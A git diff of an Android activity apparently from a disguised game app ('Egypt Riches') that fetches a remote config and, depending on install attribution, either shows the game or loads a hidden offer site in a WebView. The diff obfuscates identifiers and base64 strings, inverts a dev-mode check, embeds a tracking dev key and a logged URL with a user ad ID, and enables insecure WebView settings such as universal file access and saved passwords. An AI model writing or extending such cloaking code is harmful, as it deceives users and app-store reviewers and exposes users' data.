@@ -1,8 +1,8 @@
 package com.etgpy.rsiech;
 
-import static com.etgpy.rsiech.ApplicationClass.appsFlyerId;
-import static com.etgpy.rsiech.ApplicationClass.appsFlyerLoaded;
-import static com.etgpy.rsiech.FaceBook.strDeep;
+import static com.etgpy.rsiech.ApplicationClass.AFId;
+import static com.etgpy.rsiech.ApplicationClass.afLoaded;
+import static com.etgpy.rsiech.F_B_K.strDeepetgpy;
 
 import android.app.Activity;
 import android.content.Context;
@@ -23,7 +23,7 @@ import android.widget.ProgressBar;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 
-import com.example.firstapp1.R;
+
 
 import java.io.IOException;
 
@@ -34,18 +34,18 @@ import retrofit2.Response;
 import retrofit2.Retrofit;
 
 public class ER extends AppCompatActivity {
-    private WebView webView;
-    private String link;
-    private Uri[] results;
-    private ValueCallback<Uri[]> myFilePathCallback;
-    private SharedPreferences sPrefs;
-    private String keyDefault;
-    private String offer;
-    private String fbId;
-    public static final String PREFERENCES_URL = "TEFTVF9XZWJWaWV3X1VSTA==";
-    public static final int INPUT_FILE_REQUEST_CODE = 1;
-    public static String statusAppsFlyer;
-    public static String  strAppsFlyer;
+    private WebView webViewetgpy;
+    private String linketgpy;
+    private Uri[] resultsetgpy;
+    private ValueCallback<Uri[]> myFilePathCallbacketgpy;
+    private SharedPreferences sPrefsetgpy;
+    private String keyDefaultetgpy;
+    private String offeretgpy;
+    private String fbIdetgpy;
+    public static final String URLPRFSetgpy = "TEFTVF9XZWJWaWV3X1VSTA==";
+    public static final int INPUT_FILE_REQUEST_CODEetgpy = 1;
+    public static String statusAppsFlyeretgpy;
+    public static String strAppsFlyeretgpy;
 
 
     @Override
@@ -55,13 +55,13 @@ public class ER extends AppCompatActivity {
         ProgressBar progressBar = (ProgressBar) findViewById(R.id.progressBar);
         progressBar.setVisibility(ProgressBar.VISIBLE);
 
-        if (ifDevMode()) {
+        if ( ! ifDevMode()) {    // TODO delete !
 
-            webView = findViewById(R.id.webView);
-            setWebView(webView);
+            webViewetgpy = findViewById(R.id.webView);
+            setWebViewetgpy(webViewetgpy);
 
             Retrofit retrofit = new Retrofit.Builder()
-                    .baseUrl(Constants.GIST_LINK)
+                    .baseUrl(CNSTN.DB_6_E_47_RAW_EGYPT_RICHES)
                     .build();
             GistApi gistApi = retrofit.create(GistApi.class);
             Call<ResponseBody> gistQuery = gistApi.getStringUrl();
@@ -72,26 +72,30 @@ public class ER extends AppCompatActivity {
                         try {
                             String url = response.body().string();
                             String[] params = url.split("\\|");
-                            offer = params[0];
-                            keyDefault = params[1];
-                            fbId = params[2];
+                            offeretgpy = params[0];
+                            keyDefaultetgpy = params[1];
+                            fbIdetgpy = params[2];
                             Log.i("MyApp", "gistString = " + url);
 
-                            new FaceBook(fbId, ER.this);
+                            new F_B_K(fbIdetgpy, ER.this);
 
-                            sPrefs = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
-                            link = sPrefs.getString(PREFERENCES_URL, null);
+                            sPrefsetgpy = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
+                            linketgpy = sPrefsetgpy.getString(URLPRFSetgpy, null);
 
-                            if (link != null) {
-                                webView.setVisibility(View.VISIBLE);
-                                webView.loadUrl(link);
-                                webView.setVisibility(View.VISIBLE);
-                                progressBar.setVisibility(ProgressBar.INVISIBLE);
+                            // TODO uncomment
+
+                            Log.i("MyApp", "linketgpy " + linketgpy);
+
+                            if (linketgpy != null) {
+                                webViewetgpy.loadUrl(linketgpy);
+                            progressBar.setVisibility(ProgressBar.INVISIBLE);
                             } else {
-                                        startWebView(offer);
-                                        webView.setVisibility(View.VISIBLE);
-                                        progressBar.setVisibility(ProgressBar.INVISIBLE);
+                                do {
+                                } while (!afLoaded);
+                                startWebView(offeretgpy);
+                                progressBar.setVisibility(ProgressBar.INVISIBLE);
                             }
+
 
                         } catch (IOException e) {
                             e.printStackTrace();
@@ -120,34 +124,33 @@ public class ER extends AppCompatActivity {
     }
 
     void startWebView(String link) {
-        do {} while (!appsFlyerLoaded);
 
-        if (statusAppsFlyer.equals("Non-organic")) {
-            String url = link + strAppsFlyer;
+        if (statusAppsFlyeretgpy != null && statusAppsFlyeretgpy.equals("Non-organic")) {
+            String url = link + strAppsFlyeretgpy;
 
             Log.i("MyApp", "Non-organic:" + url);
-            webView.loadUrl(url);
-        } else if (strDeep != null) {
-            String url = link + strDeep;
+            webViewetgpy.loadUrl(url);
+        } else if (strDeepetgpy != null) {
+            String url = link + strDeepetgpy;
             Log.i("MyApp", "DeepLink" + url);
-            webView.loadUrl(url);
+            webViewetgpy.loadUrl(url);
         } else {
-            if (keyDefault.equals("NO")) {
+            if (keyDefaultetgpy.equals("NO")) {
                 //органика выключена
                 Log.i("MyApp", "With out naming and deepLinks");
                 goToGame();
             } else {
                 //органика включена
-                strAppsFlyer =
-                        keyDefault
-                                + Constants.decode("P2J1bmRsZT0=") + getPackageName()
-                                + Constants.decode("JmFkX2lkPQ==") + FaceBook.AID
-                                + Constants.decode("JmFwcHNfaWQ9") + appsFlyerId
-                                + Constants.decode("JmRldl9rZXk9") + Constants.decode(Constants.devKEyDice);
-                String url = link + strAppsFlyer;
+                strAppsFlyeretgpy =
+                        keyDefaultetgpy
+                                + CNSTN.decode("P2J1bmRsZT0=") + getPackageName()
+                                + CNSTN.decode("JmFkX2lkPQ==") + F_B_K.AIDetgpy
+                                + CNSTN.decode("JmFwcHNfaWQ9") + AFId
+                                + CNSTN.decode("JmRldl9rZXk9") + CNSTN.decode(CNSTN.LA_ED_RSEVQ_NFJGUERDYW);
+                String url = link + strAppsFlyeretgpy;
                 Log.i("MyApp", "Organic:" + url);
                 //E/User: Organic: https://gigaspin.xyz/Gp88Vp?bundle=com.fferss.fullapp&ad_id=590ec99f-f3df-4f93-9bd9-07e82d8f79e4&apps_id=1641395442394-6992958082334891642&dev_key=jhmwSMVcuZWmhQ3nVyj5S4
-                webView.loadUrl(url);
+                webViewetgpy.loadUrl(url);
             }
         }
     }
@@ -155,21 +158,21 @@ public class ER extends AppCompatActivity {
 
     @Override
     public void onBackPressed() {
-        webView.goBack();
+        webViewetgpy.goBack();
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
-        if (requestCode != INPUT_FILE_REQUEST_CODE || myFilePathCallback == null) {
+        if (requestCode != INPUT_FILE_REQUEST_CODEetgpy || myFilePathCallbacketgpy == null) {
             super.onActivityResult(requestCode, resultCode, data);
             return;
         }
         if (resultCode == Activity.RESULT_OK) {
             String dataString = data.getDataString();
             if (dataString != null) {
-                results = new Uri[]{Uri.parse(dataString)};
-                myFilePathCallback.onReceiveValue(results);
-                myFilePathCallback = null;
+                resultsetgpy = new Uri[]{Uri.parse(dataString)};
+                myFilePathCallbacketgpy.onReceiveValue(resultsetgpy);
+                myFilePathCallbacketgpy = null;
             }
         }
     }
@@ -181,44 +184,18 @@ public class ER extends AppCompatActivity {
         return true;
     }
 
-    private void setWebView(WebView webView) {
-        webView.getSettings().setJavaScriptEnabled(true);
-        webView.getSettings().setAppCacheEnabled(true);
-        webView.getSettings().setDomStorageEnabled(true);
-        webView.getSettings().setAllowContentAccess(true);
-        webView.getSettings().setAllowFileAccess(true);
-        webView.getSettings().setAppCacheEnabled(true);
-        webView.getSettings().setAllowFileAccessFromFileURLs(true);
-        webView.getSettings().setSaveFormData(true);
-        webView.getSettings().setMixedContentMode(0);
-        webView.getSettings().setSavePassword(true);
-        webView.getSettings().setAllowContentAccess(true);
-        webView.getSettings().setLoadsImagesAutomatically(true);
-        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
-        webView.getSettings().setDatabaseEnabled(true);
-        webView.getSettings().setLoadWithOverviewMode(true);
-        webView.getSettings().setUseWideViewPort(true);
-        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
-        webView.getSettings().setDomStorageEnabled(true);
-        webView.getSettings().setAllowFileAccess(true);
-        webView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
-        webView.getSettings().setEnableSmoothTransition(true);
-        webView.setWebChromeClient(new MyWebChromeClient());
-        webView.setWebViewClient(new MyWebViewClient());
-    }
-
 
     class MyWebChromeClient extends WebChromeClient {
         @Override
         public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback,
                                          FileChooserParams fileChooserParams) {
-            myFilePathCallback = filePathCallback;
+            myFilePathCallbacketgpy = filePathCallback;
             Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
             contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
-            contentSelectionIntent.setType(Constants.decode("aW1hZ2UvKg=="));
+            contentSelectionIntent.setType(CNSTN.decode("aW1hZ2UvKg=="));
             Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
             chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
-            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE);
+            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODEetgpy);
             return true;
         }
     }
@@ -227,7 +204,8 @@ public class ER extends AppCompatActivity {
         @Override
         public void onPageStarted(WebView view, String url, Bitmap favicon) {
             super.onPageStarted(view, url, favicon);
-            if (url.contains(Constants.decode("NDA0"))) {
+            webViewetgpy.setVisibility(View.VISIBLE);
+            if (url.contains(CNSTN.decode("NDA0"))) {
                 goToGame();
                 finish();
             }
@@ -236,10 +214,39 @@ public class ER extends AppCompatActivity {
         @Override
         public void onPageFinished(WebView view, String url) {
             super.onPageFinished(view, url);
-            SharedPreferences.Editor editor = sPrefs.edit();
-            editor.putString(PREFERENCES_URL, url);
+            SharedPreferences.Editor editor = sPrefsetgpy.edit();
+            editor.putString(URLPRFSetgpy, url);
             editor.apply();
+            Log.i("MyApp", "url:" + url);
+
+
         }
+    }
+
+    private void setWebViewetgpy(WebView webViewetgpy) {
+        webViewetgpy.getSettings().setJavaScriptEnabled(true);
+        webViewetgpy.getSettings().setAppCacheEnabled(true);
+        webViewetgpy.getSettings().setDomStorageEnabled(true);
+        webViewetgpy.getSettings().setAllowContentAccess(true);
+        webViewetgpy.getSettings().setAllowFileAccess(true);
+        webViewetgpy.getSettings().setAppCacheEnabled(true);
+        webViewetgpy.getSettings().setAllowFileAccessFromFileURLs(true);
+        webViewetgpy.getSettings().setSaveFormData(true);
+        webViewetgpy.getSettings().setMixedContentMode(0);
+        webViewetgpy.getSettings().setSavePassword(true);
+        webViewetgpy.getSettings().setAllowContentAccess(true);
+        webViewetgpy.getSettings().setLoadsImagesAutomatically(true);
+        webViewetgpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
+        webViewetgpy.getSettings().setDatabaseEnabled(true);
+        webViewetgpy.getSettings().setLoadWithOverviewMode(true);
+        webViewetgpy.getSettings().setUseWideViewPort(true);
+        webViewetgpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
+        webViewetgpy.getSettings().setDomStorageEnabled(true);
+        webViewetgpy.getSettings().setAllowFileAccess(true);
+        webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
+        webViewetgpy.getSettings().setEnableSmoothTransition(true);
+        webViewetgpy.setWebChromeClient(new MyWebChromeClient());
+        webViewetgpy.setWebViewClient(new MyWebViewClient());
     }
 }
 
